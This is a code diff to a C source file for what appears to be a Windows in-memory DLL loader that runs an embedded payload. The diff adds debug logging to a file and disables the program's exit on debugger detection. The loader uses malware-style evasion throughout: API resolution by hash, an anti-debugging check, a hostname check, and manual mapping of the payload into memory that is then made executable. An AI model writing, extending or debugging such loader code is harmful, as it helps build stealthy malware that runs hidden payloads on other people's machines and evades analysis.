@@ -12,6 +12,20 @@
 
 typedef void (*DllEntryPoint)(HINSTANCE, DWORD, LPVOID);
 
+void LogToFile(const char* format, ...)
+{
+    FILE* logFile = fopen("debug_log.txt", "a+"); // Append mode in current dir
+    if (!logFile) return;
+
+    va_list args;
+    va_start(args, format);
+    vfprintf(logFile, format, args);
+    fprintf(logFile, "\n");
+    va_end(args);
+
+    fclose(logFile);
+}
+
 int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
     
     // Seed the random number generator
@@ -27,13 +41,14 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     printf("beginning\n");    
     HMODULE hKernel32dll = CustomGetModuleHandle(KERNEL32_HASH); // Load Kernel32 module
     HMODULE hUser32dll = NULL; // Placeholder for Kernel32 module handle
-    
+    hUser32dll = CustomGetModuleHandle(USER32_HASH); // Load User32 module
     // Check if the program is being debugged
     if (is_being_debugged()) {
         printf("Error during file openning\n"); // Debugging detected
-        return 1;
+        // return 1;
     } else {
-        hUser32dll = CustomGetModuleHandle(USER32_HASH); // Load User32 module
+        printf("No debugging detected\n"); // No debugging detected
+        // hUser32dll = CustomGetModuleHandle(USER32_HASH); // Load User32 module
     }
 
     // Validate hostname and adjust money spent accordingly
@@ -86,21 +101,47 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
 
         PIMAGE_NT_HEADERS64 dll_htHeaders = PE_getNtheaders(payload);
 
+        HANDLE hProc = CUR_PROC;
+
         // Step 2: Allocate memory at dll's preferred virtual address
         SIZE_T dll_vSize = dll_htHeaders->OptionalHeader.SizeOfImage;
         LPVOID dll_vAddr = (LPVOID)dll_htHeaders->OptionalHeader.ImageBase;
 
-        LPVOID allocated_vAddr = _AllocVirtMem((HANDLE)-1, dll_vAddr, dll_vSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+        LPVOID allocated_vAddr = _AllocVirtMem(hProc, dll_vAddr, dll_vSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
         if (!allocated_vAddr) {
-            allocated_vAddr = _AllocVirtMem((HANDLE)-1, NULL, dll_vSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+            allocated_vAddr = _AllocVirtMem(hProc, NULL, dll_vSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
             if (!allocated_vAddr) return 1;//"Memory allocation failed");
         }
         // Get delta between preferred and allocated address
         DWORD_PTR delta = (DWORD_PTR)allocated_vAddr - (DWORD_PTR)dll_vAddr;
 
+        LogToFile("Allocated at: 0x%p", allocated_vAddr);
+        LogToFile("Payload size: 0x%X", dll_htHeaders->OptionalHeader.SizeOfHeaders);
+        LogToFile("Image size: 0x%X", dll_htHeaders->OptionalHeader.SizeOfImage);
+        LogToFile("Image base: 0x%p", dll_htHeaders->OptionalHeader.ImageBase);
+        LogToFile("Delta: 0x%p", (void*)delta);
+        LogToFile("WriteProcessMemory function ptr: 0x%p", _WriteVirtMem);
+
+        BYTE* p = (BYTE*)payload;
+        LogToFile("Payload first bytes: %02X %02X %02X %02X", p[0], p[1], p[2], p[3]);
+
         // Step 3: Copy the DLL headers 
-        if (!_WriteVirtMem((HANDLE)-1, allocated_vAddr, payload, dll_htHeaders->OptionalHeader.SizeOfHeaders, NULL))
-            return 1;//"_WriteVirtMem() failed");
+        MEMORY_BASIC_INFORMATION mbi2 = {0};
+        if (VirtualQuery(allocated_vAddr, &mbi2, sizeof(mbi2))) {
+            LogToFile("Allocated region: Base=0x%p, Size=0x%Ix, State=0x%X, Protect=0x%X",
+                    mbi2.BaseAddress, mbi2.RegionSize, mbi2.State, mbi2.Protect);
+        } else {
+            LogToFile("VirtualQuery failed on allocated_vAddr: Error %lu", GetLastError());
+        }
+
+        LogToFile("Here");
+        // temporary fix cause target process is current process
+        memcpy(allocated_vAddr, payload, dll_htHeaders->OptionalHeader.SizeOfHeaders);
+        // if (!_WriteVirtMem(hProc, allocated_vAddr, payload, dll_htHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
+        //     DWORD err = GetLastError();
+        //     LogToFile("WriteProcessMemory failed. Error: %lu", err);
+        //     return 1;//"_WriteVirtMem() failed");
+        // }
 
 
         // Step 4: Copy the DLL sections
@@ -110,7 +151,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
             LPVOID sectionData = (LPVOID)((ULONG_PTR)payload + section[i].PointerToRawData);
             SIZE_T sectionSize = section[i].SizeOfRawData;
 
-            if (!_WriteVirtMem((HANDLE)-1, sectionAddr, sectionData, sectionSize, NULL))
+            if (!_WriteVirtMem(hProc, sectionAddr, sectionData, sectionSize, NULL))
                 return 1;//"_WriteVirtMem() failed");
         }
 
@@ -174,9 +215,9 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
 
         // Step 6.1: Set the memory protection to PAGE_EXECUTE_READ
         DWORD oldProtect = 0;
-        if (!_ProtectVirtMem((HANDLE)-1, allocated_vAddr, dll_vSize, PAGE_EXECUTE_READ, &oldProtect)) {
+        if (!_ProtectVirtMem(hProc, allocated_vAddr, dll_vSize, PAGE_EXECUTE_READ, &oldProtect)) {
             // VirtualFreeEx_t _FreeVirtMem = (VirtualFreeEx_t)CustomGetProcAddress(hKernel32dll, VIRTUAL_FREE_HASH);
-            // _FreeVirtMem((HANDLE)-1, allocated_vAddr, 0, MEM_RELEASE); // Free the allocated memory
+            // _FreeVirtMem(hProc, allocated_vAddr, 0, MEM_RELEASE); // Free the allocated memory
             return 1;// Failed to VirtualProtect 
         }
 
